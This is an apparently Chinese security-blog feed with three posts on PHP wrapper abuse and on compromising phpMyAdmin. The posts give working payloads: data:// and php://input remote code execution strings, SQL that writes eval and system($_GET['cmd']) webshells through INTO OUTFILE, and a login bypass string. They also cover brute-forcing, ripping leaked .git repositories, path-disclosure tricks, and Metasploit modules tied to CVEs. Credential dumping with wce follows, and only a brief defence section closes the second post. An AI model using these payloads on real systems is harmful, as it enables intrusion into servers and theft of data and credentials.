    <id>http://yoursite.com/代码/2017/04/09/PHP伪协议.html</id>
    <published>2017-04-09T04:38:31.000Z</published>
    <updated>2017-04-09T05:25:11.525Z</updated>
    
    <content type="html"><![CDATA[<h3 id="PHP协议-封装协议"><a href="#PHP协议-封装协议" class="headerlink" title="PHP协议/封装协议"></a>PHP协议/封装协议</h3><table>
<thead>
<tr>
<th>包装或协议</th>
<th style="text-align:center">控制能力</th>
<th style="text-align:right">allow_url_include</th>
<th style="text-align:right">漏洞类型</th>
<th style="text-align:right">备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>file://</td>
<td style="text-align:center">-</td>
<td style="text-align:right">Off</td>
<td style="text-align:right">LFI /文件操作</td>
</tr>
<tr>
<td>glob://</td>
<td style="text-align:center">-</td>
<td style="text-align:right">Off</td>
<td style="text-align:right">目录遍历</td>
</tr>
<tr>
<td>php://filter/read</td>
<td style="text-align:center">include</td>
<td style="text-align:right">Off</td>
<td style="text-align:right">文件泄露</td>
<td style="text-align:right">PHP：//filter/read=convert.base64-encode/resource=index.php</td>
</tr>
<tr>
<td>php://filter/write</td>
<td style="text-align:center">file_put_contents</td>
<td style="text-align:right">Off</td>
<td style="text-align:right">编码</td>
<td style="text-align:right">file_put_contents(“php://filter/write=string.rot13/resource=x.txt”,”content”);</td>
</tr>
<tr>
<td>php://input</td>
<td style="text-align:center">include</td>
<td style="text-align:right">On</td>
<td style="text-align:right">RCE</td>
<td style="text-align:right">Encoding is required while reading .php source: &lt;?php echo base64_encode(file_get_contents(“solution.php”));?&gt; OR just use &lt;?php system(‘cat x.php’);?&gt;</td>
</tr>
<tr>
<td>data://</td>
<td style="text-align:center">include</td>
<td style="text-align:right">On</td>
<td style="text-align:right">RCE</td>
<td style="text-align:right">data:text/plain,&lt;?php system(“id”)?&gt; OR data:text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpPz4=</td>
</tr>
<tr>
<td>zip://</td>
<td style="text-align:center">include + uploaded file</td>
<td style="text-align:right">Off</td>
<td style="text-align:right">RCE</td>
</tr>
<tr>
<td>phar://</td>
<td style="text-align:center">include + uploaded file</td>
<td style="text-align:right">Off</td>
<td style="text-align:right">RCE</td>
<td style="text-align:right">PHP版本&gt; = 5.3</td>
</tr>
</tbody>
</table>
<a id="more"></a>
<p>php中支持的伪协议</p>
<pre><code>file:// — 访问本地文件系统
http:// — 访问 HTTP(s) 网址
ftp:// — 访问 FTP(s) URLs
php:// — 访问各个输入/输出流（I/O streams）
zlib:// — 压缩流
data:// — 数据（RFC 2397）
glob:// — 查找匹配的文件路径模式
phar:// — PHP 归档
ssh2:// — Secure Shell 2
rar:// — RAR
ogg:// — 音频流
expect:// — 处理交互式的流
</code></pre><p>这里可以参考<a href="http://php.net/manual/zh/wrappers.php" target="_blank" rel="external">官方文档</a>进行查看。而遇见最多的也就是php://协议了：</p>
<ul>
<li>php://stdin<br>主要用于php cli的输入</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">while($line = fopen(&apos;php://stdin&apos;,&apos;r&apos;))&#123;  </div><div class="line">    echo fgets($line);  </div><div class="line">&#125;  </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p><img src="http://i4.buimg.com/567571/f0b778051856c477.jpg" alt=""></p>
<ul>
<li>php://stdout<br>主要用于php cli的输入<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">$fh = fopen(&apos;php://stdout&apos;, &apos;w&apos;);  </div><div class="line">fwrite($fh, &quot;标准输出php://stdout\n&quot;);  </div><div class="line">fclose($fh);  </div><div class="line">fwrite(STDOUT, &quot;标准输出STDOUT\n&quot;);  </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="http://i4.buimg.com/567571/e62036bab64c514b.jpg" alt=""></p>
<ul>
<li>php://input<br>可以读取到post没有解析的原始数据<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line"> echo file_get_contents($_GET[&quot;a&quot;]);  </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="http://i4.buimg.com/567571/caba05f9460d9dbe.jpg" alt=""><br>当php代码换成<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">$code = $_GET[&apos;a&apos;];  </div><div class="line">include($code);  </div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>而且当php远程包含打开的时候（当allow_url_include=on),就可以造成任意代码执行。<br><img src="http://i4.buimg.com/567571/52bcb6ca96711975.jpg" alt=""></p>
<ul>
<li>php://output<br>是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line"> $code=$_GET[&quot;a&quot;];  </div><div class="line"> file_put_contents($code,&quot;test&quot;);   </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="http://i4.buimg.com/567571/ab8f21052b4e2890.jpg" alt=""></p>
<ul>
<li>php://filter<br>是一种元封装器， 设计用于数据流打开时的筛选过滤应用<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">$filename=$_GET[&quot;a&quot;];  </div><div class="line">$data=&quot;test&quot;;  </div><div class="line">file_put_contents($filename, $data);  </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>?a=php://filter/write=string.tolower/resource=test.php<br>可以往服务器中写入一个文件内容全为小写且文件名为test.php的文件：<br>其中 ：<br>（1）string.tolower //写入内容全部变成小写<br>（2）string.toupper //写入内容全部变成大写<br>（3）string.rot13 //写入内容全部对字符串执行 ROT13 编码<br>通过：?a=php://filter/convert.base64-encode/resource=test.php<br>可以往服务器中写入一个文件内容为base64编码且文件名为test.php的文件<br><img src="http://i2.muimg.com/567571/f80e4710de9ee31d.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">$filename=$_GET[&quot;a&quot;];  </div><div class="line">echo file_get_contents($filename);  </div><div class="line">?&gt; </div><div class="line"></div><div class="line">&lt;?php  </div><div class="line">$filename=$_GET[&quot;a&quot;]; </div><div class="line">include(&quot;$filename&quot;);  </div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>?a=php://filter/convert.base64-encode/resource=test.php,就可以把test.php的内容以base64编码的方式显示出来</p>
<p>双引号包含的变量$filename，可以当成正常变量执行，而单引号包裹的变量则会当成字符串</p>
<ul>
<li>expect://<br>可以用这个协议执行任意linux的指令<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">$code = $_GET[&apos;hax&apos;];  </div><div class="line">include($code);  </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>那么可以用?hax=expect://command 来执行任意linux指令，但是：<br>Note:该封装协议默认未开启<br>为了使用 expect:// 封装器，你必须安装» PECL 上的 » Expect扩展。</p>
<ul>
<li>data://<br>数据流封装器<br>当allow_url_include 打开的时候，任意文件包含就会成为任意命令执行<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">$filename=$_GET[&quot;a&quot;];  </div><div class="line">include(&quot;$filename&quot;);  </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="http://i4.buimg.com/567571/19570d7acea8b8a7.jpg" alt=""></p>
<p>参考链接：<br><a href="http://blog.csdn.net/niexinming/article/details/52605144" target="_blank" rel="external">http://blog.csdn.net/niexinming/article/details/52605144</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;PHP协议-封装协议&quot;&gt;&lt;a href=&quot;#PHP协议-封装协议&quot; class=&quot;headerlink&quot; title=&quot;PHP协议/封装协议&quot;&gt;&lt;/a&gt;PHP协议/封装协议&lt;/h3&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;包装或协议&lt;/th&gt;
&lt;th style=&quot;text-align:center&quot;&gt;控制能力&lt;/th&gt;
&lt;th style=&quot;text-align:right&quot;&gt;allow_url_include&lt;/th&gt;
&lt;th style=&quot;text-align:right&quot;&gt;漏洞类型&lt;/th&gt;
&lt;th style=&quot;text-align:right&quot;&gt;备注&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;file://&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;-&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;Off&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;LFI /文件操作&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;glob://&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;-&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;Off&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;目录遍历&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;php://filter/read&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;include&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;Off&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;文件泄露&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;PHP：//filter/read=convert.base64-encode/resource=index.php&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;php://filter/write&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;file_put_contents&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;Off&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;编码&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;file_put_contents(“php://filter/write=string.rot13/resource=x.txt”,”content”);&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;php://input&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;include&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;On&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;RCE&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;Encoding is required while reading .php source: &amp;lt;?php echo base64_encode(file_get_contents(“solution.php”));?&amp;gt; OR just use &amp;lt;?php system(‘cat x.php’);?&amp;gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;data://&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;include&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;On&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;RCE&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;data:text/plain,&amp;lt;?php system(“id”)?&amp;gt; OR data:text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpPz4=&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;zip://&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;include + uploaded file&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;Off&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;RCE&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;phar://&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;include + uploaded file&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;Off&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;RCE&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;PHP版本&amp;gt; = 5.3&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
    
    </summary>
    
      <category term="代码" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81/"/>
    
    
      <category term="php" scheme="http://yoursite.com/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>PhpMyadmin分析（二）</title>
    <link href="http://yoursite.com/%E6%B5%8B%E8%AF%95/2017/04/03/PhpMyadmin%E5%88%86%E6%9E%90%EF%BC%88%E4%BA%8C%EF%BC%89.html"/>
    <id>http://yoursite.com/测试/2017/04/03/PhpMyadmin分析（二）.html</id>
    <published>2017-04-03T04:37:37.000Z</published>
    <updated>2017-04-03T13:34:26.487Z</updated>
    
    <content type="html"><![CDATA[<p>　　通过上节的测试阶段，我们已经掌握了一批具有PhpMyadmn页面的URL。我们现在就是需要登录到里面，继而进一步进行我们想要的操作。</p>
<h3 id="0x01-获取root账号"><a href="#0x01-获取root账号" class="headerlink" title="0x01 获取root账号"></a>0x01 获取root账号</h3><ul>
<li>1.1 暴力破解<br>　　可以使用<a href="http://pan.baidu.com/s/1c1LD6co" target="_blank" rel="external">phpmyadmin多线程批量破解工具</a>进行批量破解，这里我们需要的就是强大的密码字典以及常用的phpmyadmin用户名。或者使用Burp进行抓包暴力破解。<a id="more"></a><br><img src="http://i2.muimg.com/567571/eadc3941f15eb273.jpg" alt=""><br><img src="http://i4.buimg.com/567571/114393de4f21e659.jpg" alt=""></li>
<li>1.2 源代码泄露<br>　　很多流行架构在Windows及Linux中都会有目录泄露漏洞，通过目录泄露漏洞可以发现源代码打包文件，从打包文件中去寻找数据库配置文件，关键字config、db。常见web源码泄露：<br>　　<strong>.hg源码泄露</strong><br>　　　　形成原因：hg init的时候会生成.hg<br>　　　　eg: <a href="http://www.xxx.com/.hg/" target="_blank" rel="external">http://www.xxx.com/.hg/</a><br>　　　　利用工具<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="external">dvcs-ripper</a>　　rip-hg.pl -v -u <a href="http://www.xxx.com/.hg/" target="_blank" rel="external">http://www.xxx.com/.hg/</a><br>　　<strong>.git源码泄露</strong><br>　　　　形成原因：在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。<br>　　　　eg:<a href="http://www.xxx.com/.git/config" target="_blank" rel="external">http://www.xxx.com/.git/config</a><br>　　　　利用工具<a href="https://github.com/lijiejie/GitHack" target="_blank" rel="external">githack</a>　　GitHack.py <a href="http://www.xxx.com/.git/" target="_blank" rel="external">http://www.xxx.com/.git/</a><br>　　<strong>.DS_Store文件泄漏</strong><br>　　　　形成原因：在发布代码时未删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息。<br>　　　　eg:<a href="http://www.xxx.com/.ds_store" target="_blank" rel="external">http://www.xxx.com/.ds_store</a><br>　　　　利用工具<a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="external">dsstoreexp</a>　　python ds_store_exp.py <a href="http://www.xxx.com/.DS_Store" target="_blank" rel="external">http://www.xxx.com/.DS_Store</a><br>　　<strong>SVN源码泄露</strong><br>　　　　形成原因：在使用SVN管理本地代码过程中，会自动生成一个名为.svn的隐藏文件夹，其中包含重要的源代码信息。<br>　　　　利用工具：<a href="http://pan.baidu.com/s/1mrNpB" target="_blank" rel="external">http://pan.baidu.com/s/1mrNpB</a></li>
<li><p>1.3 备份文件<br>　　在网站的使用过程中，往往需要对网站中的文件进行修改、升级。此时就需要对网站整站或者其中某一页面进行备份。当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站web目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">.rar</div><div class="line">.zip</div><div class="line">.7z</div><div class="line">.tar.gz</div><div class="line">.bak</div><div class="line">.swp</div><div class="line">.txt</div><div class="line">.html</div></pre></td></tr></table></figure>
</li>
<li><p>1,4 其他方法获取</p>
</li>
</ul>
<h3 id="0x02-root账号获取webshell"><a href="#0x02-root账号获取webshell" class="headerlink" title="0x02 root账号获取webshell"></a>0x02 root账号获取webshell</h3><h4 id="直接读取后门文件"><a href="#直接读取后门文件" class="headerlink" title="直接读取后门文件"></a>直接读取后门文件</h4><p>　　有些网站可能前期被渗透过，网站可能有webshell，特别是一句话后门，如果有后门则可以通过一句话后门暴力破解获取。可以通过获取到的源码进行分析，获取后门文件。</p>
<h4 id="导出一句话后门"><a href="#导出一句话后门" class="headerlink" title="导出一句话后门"></a>导出一句话后门</h4><ul>
<li>1、通过创建表的方式</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">CREATE TABLE `mysql`.`darkmoon` (`darkmoon1` TEXT NOT NULL );</div><div class="line">INSERT INTO `mysql`.`darkmoon` (`darkmoon1` ) VALUES (&apos;&lt;?php @eval($_POST[123]);?&gt;&apos;);</div><div class="line">SELECT `darkmoon1` FROM `darkmoon` INTO OUTFILE &apos;E:/wamp/www/123.php&apos;;</div><div class="line">DROP TABLE IF EXISTS `darkmoon`;</div></pre></td></tr></table></figure>
<p>　　上面查询语句就是在mysql数据库中创建darkmoon表，然后加入一个名字为darkmoon1的字段，并在darkmoon1的字段中插入一句话代码，然后从darkmoon1字段里面导出一句话到网站的真实路径“E:/wamp/www/”，最后就是删除darkmoon这个表。<br>　　<strong>注意：</strong>在使用以上代码时必须选择mysql数据库，并在phpMyAdmin中选择SQL，然后执行以上代码即可。在执行导入到网站的命令中应该在mysql数据库中操作，需要修改的地方是网站的真实路径，网站真实路径我们上节已经讨论过好几种方法。</p>
<ul>
<li>2、直接导出一句话后门文件<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select &apos;&lt;?php @eval($_POST[123]);?&gt;&apos;INTO OUTFILE &apos;E:/wamp/www/123.php&apos;;</div></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="http://i4.buimg.com/567571/5012807da137aac3.jpg" alt=""></p>
<ul>
<li>3、直接执行命令权限的shell<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select &apos;&lt;?php echo \&apos;&lt;pre&gt;\&apos;;system($_GET[\&apos;cmd\&apos;]); echo \&apos;&lt;/pre&gt;\&apos;; ?&gt;&apos; INTO OUTFILE &apos;E:/wamp/www/123.php&apos;;</div></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="http://i1.piimg.com/567571/0882899e9bfbe2b5.jpg" alt=""></p>
<ul>
<li>4、获取网站管理员密码<br>　　当我们上述几种情况无法写入webshell的时候，我们可以查看数据库中管理员的密码，一般都是MD5加密之后的，然后获取后台登录页面使用管理员的权限登录。根据后台的管理模式查找可以上传webshell的方法同样也可以拿webshell。<br><img src="http://i4.buimg.com/567571/07c2b5c3670eef12.jpg" alt=""><br>　　可以看到hash加密之后d033e22ae348aeb5660fc2140aec35850c4da997，相对于MD5多了8位，于是就相应的删除前面或者后面的，d033e22ae348aeb5660fc2140aec3585解密之后密码为admin。<h3 id="0x03-服务器提权"><a href="#0x03-服务器提权" class="headerlink" title="0x03 服务器提权"></a>0x03 服务器提权</h3>　　根据我们刚才上传的一句话木马使用菜刀进行连接继而上传大马进行提权。</li>
</ul>
<p><img src="http://i2.muimg.com/567571/a16e4d727851f0f6.jpg" alt=""></p>
<p>　　直接在虚拟终端运行命令，查看是system权限直接添加用户名然后远程桌面。或者上传wce64.exe或g64.exe直接获取管理员用户的明文密码登录。<br><img src="http://i4.buimg.com/567571/fb85029f85e32da1.jpg" alt=""></p>
<h3 id="0x04-防范方法"><a href="#0x04-防范方法" class="headerlink" title="0x04 防范方法"></a>0x04 防范方法</h3><p>PhpMyadmin密码帐号暴力破解使用的方法主要是通过字典来进行穷举登录，因此其防范方法可以采取以下措施：<br>　　(1)、设置Root帐号为非缺省名称比如MyRoot等名称，通过phpMyadmin登录后可以进行修改。<br>　　(2)、设置Root帐号所对应的密码为强口令，密码为大小写、特殊字符、字母等等组合体，最好超过10位数以上。<br>　　(3)、在CMS系统中尽量每一个库对应相应的CMS系统帐号，各个系统之间相对独立，且默认在config.php、config.inc.php等配置文件中也是使用相对独立的库帐号，建议不使用Root帐号和密码进行配置。<br>　　(4)、网站代码使用密码进行压缩打包，系统正式部署后清除无关文件。不在网站根目录下保留源代码和数据库文件等。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;　　通过上节的测试阶段，我们已经掌握了一批具有PhpMyadmn页面的URL。我们现在就是需要登录到里面，继而进一步进行我们想要的操作。&lt;/p&gt;
&lt;h3 id=&quot;0x01-获取root账号&quot;&gt;&lt;a href=&quot;#0x01-获取root账号&quot; class=&quot;headerlink&quot; title=&quot;0x01 获取root账号&quot;&gt;&lt;/a&gt;0x01 获取root账号&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;1.1 暴力破解&lt;br&gt;　　可以使用&lt;a href=&quot;http://pan.baidu.com/s/1c1LD6co&quot;&gt;phpmyadmin多线程批量破解工具&lt;/a&gt;进行批量破解，这里我们需要的就是强大的密码字典以及常用的phpmyadmin用户名。或者使用Burp进行抓包暴力破解。
    
    </summary>
    
      <category term="测试" scheme="http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>PhpMyadmin分析（一）</title>
    <link href="http://yoursite.com/%E6%B5%8B%E8%AF%95/2017/04/03/PhpMyadmin%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89.html"/>
    <id>http://yoursite.com/测试/2017/04/03/PhpMyadmin分析（一）.html</id>
    <published>2017-04-03T03:10:06.000Z</published>
    <updated>2017-04-03T12:23:29.645Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-PhpMyadmin"><a href="#0x01-PhpMyadmin" class="headerlink" title="0x01 PhpMyadmin"></a>0x01 PhpMyadmin</h3><p>　　Phpmyadmin是一款以PHP为基础，以Web-Base方式架构在网站主机上的MySQL的数据库管理工具，通过提供的mysql数据库用户账号和密码对所管理的数据库实施操作。在渗透过程中，一旦获取其mysql账号和对应的密码，轻者获取其账号所管理数据库，重者可以配合其它漏洞获取webshell权限和系统权限。</p>
<h3 id="0x02-PhpMyadmin各版本漏洞"><a href="#0x02-PhpMyadmin各版本漏洞" class="headerlink" title="0x02 PhpMyadmin各版本漏洞"></a>0x02 PhpMyadmin各版本漏洞</h3><p>一、影响版本：3.5.x &lt; 3.5.8.1 and 4.0.0 &lt; 4.0.0-rc3 ANYUN.ORG<a id="more"></a><br>　　概述：PhpMyAdmin存在PREG_REPLACE_EVAL漏洞<br>　　利用模块：exploit/multi/http/phpmyadmin_preg_replace<br>　　CVE: CVE-2013-3238</p>
<p>二、影响版本：phpMyAdmin v3.5.2.2<br>　　概述：PhpMyAdmin存在server_sync.php 后门漏洞<br>　　利用模块：exploit/multi/http/phpmyadmin_3522_backdoor<br>　　CVE: CVE-2012-5159</p>
<p>三、影响版本： 2.11.x    &lt; 2.11.9.5 and 3.x &lt; 3.1.3.1;<br>　　概述：PhpMyAdmin配置文件/config/config.inc.php存在命令执行<br>　　利用模块：exploit/unix/webapp/phpmyadmin_config<br>　　CVE: CVE-2009-1151</p>
<p>四、影响版本：2.11.3 / 2.11.4<br>　　利用方法：用户名处写入’localhost’@’@”则登录成功。 (注意全部是英文标点符号，最后一个为英文双引号)</p>
<h3 id="0x03-附上几个php爆绝对路径的办法"><a href="#0x03-附上几个php爆绝对路径的办法" class="headerlink" title="0x03 附上几个php爆绝对路径的办法"></a>0x03 附上几个php爆绝对路径的办法</h3><ul>
<li><p>1、单引号爆路径<br>直接在URL后面添加单引号，要求单引号没有被过滤(gpc=off)且服务器默认返回错误信息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">EG：</div><div class="line">   www.xxx.com/news.php?id=149&apos;</div></pre></td></tr></table></figure>
</li>
<li><p>2、错误参数值爆路径<br>将要提交的参数值改成错误值，比如-1。单引号被过滤时不妨试试。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">EG：</div><div class="line">   www.xxx.com/news.php?id=-1</div></pre></td></tr></table></figure>
</li>
<li><p>3、Google爆路径<br>结合关键字和site语法搜索出错页面的网页快照，常见关键字有warning和fatal error。注意，如果目标站点是二级域名，site接的是其对应的顶级域名，这样得到的信息要多得多。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">EG：</div><div class="line">   site:xxx.com warning     </div><div class="line">   site:xxx.com &quot;fatal error&quot;</div></pre></td></tr></table></figure>
</li>
<li><p>4、测试文件爆路径<br>很多网站的根目录下都存在测试文件，脚本代码通常都是phpinfo()，可以先使用御剑等目录扫描工具进行扫描。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">EG：</div><div class="line">   www.xxx.com/test.php</div><div class="line">   www.xxx.com/ceshi.php</div><div class="line">   www.xxx.com/info.php</div><div class="line">   www.xxx.com/phpinfo.php</div><div class="line">   www.xxx.com/php_info.php</div><div class="line">   www.xxx.com/1.php</div></pre></td></tr></table></figure>
</li>
<li><p>5、phpmyadmin爆路径<br>一旦找到phpmyadmin的管理页面，再访问该目录下的某些特定文件，就很有可能爆出物理路径。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">EG:</div><div class="line">   www.xxx.com/phpMyAdmin/libraries/select_lang.lib.php</div><div class="line">   www.xxx.com/phpMyAdmin/darkblue_orange/layout.inc.php</div><div class="line">   www.xxx.com/phpMyAdmin/index.php?lang[]=1</div><div class="line">   www.xxx.com/phpmyadmin/themes/darkblue_orange/layout.inc.php</div></pre></td></tr></table></figure>
</li>
</ul>
<ul>
<li><p>6、配置文件找路径<br>如果注入点有文件读取权限，就可以手工load_file或工具读取配置文件，再从中寻找路径信息（一般在文件末尾）。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">Windows:</div><div class="line">   c:\windows\php.ini php配置文件</div><div class="line">   c:\windows\system32\inetsrv\MetaBase.xml IIS虚拟主机配置文件</div><div class="line">Linux:</div><div class="line">   /etc/php.ini php配置文件</div><div class="line">   /etc/httpd/conf.d/php.conf</div><div class="line">   /etc/httpd/conf/httpd.conf Apache配置文件</div><div class="line">   /usr/local/apache/conf/httpd.conf</div><div class="line">   /usr/local/apache2/conf/httpd.conf</div><div class="line">   /usr/local/apache/conf/extra/httpd-vhosts.conf 虚拟目录配置文件</div></pre></td></tr></table></figure>
</li>
<li><p>7、nginx文件类型错误解析爆路径<br>要求Web服务器是nginx，且存在文件类型解析漏洞。有时在图片地址后加/x.php，该图片不但会被当作php文件执行，还有可能爆出物理路径。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">EG:</div><div class="line">   www.xxx.com/top.jpg/x.php</div></pre></td></tr></table></figure>
</li>
<li><p>8、通过mysql查询<br>　　select @@datadir;<br><img src="http://i4.buimg.com/567571/0a5af818ecaa1d66.jpg" alt=""></p>
<h3 id="0X04-获取PhpMyadmin信息"><a href="#0X04-获取PhpMyadmin信息" class="headerlink" title="0X04 获取PhpMyadmin信息"></a>0X04 获取PhpMyadmin信息</h3><p>　　想要利用PhpMyadmin的漏洞，那么首先就要知道那些网站或者URL中存在PhpMyadmin，这个是重中之重，除了谷歌和百度，这里只要介绍两个很重要的搜索引擎<a href="https://www.zoomeye.org/" target="_blank" rel="external"><strong>Zoomeye</strong></a>和<a href="https://exploits.shodan.io" target="_blank" rel="external"><strong>Shodan</strong></a>。</p>
</li>
</ul>
